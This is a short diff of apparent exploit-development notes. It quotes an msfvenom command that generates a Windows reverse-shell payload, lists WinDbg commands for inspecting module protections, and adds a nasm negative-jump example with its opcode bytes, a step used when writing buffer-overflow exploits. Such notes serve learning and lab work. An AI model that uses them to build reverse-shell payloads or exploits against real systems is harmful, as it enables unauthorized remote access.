@@ -7,3 +7,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread
 ============
 .load narly
 !nmod
+============
+negative jump example
+
+nasm > jmp $-0x8fc
+00000000  E9FFF6FFFF        jmp 0xfffff704
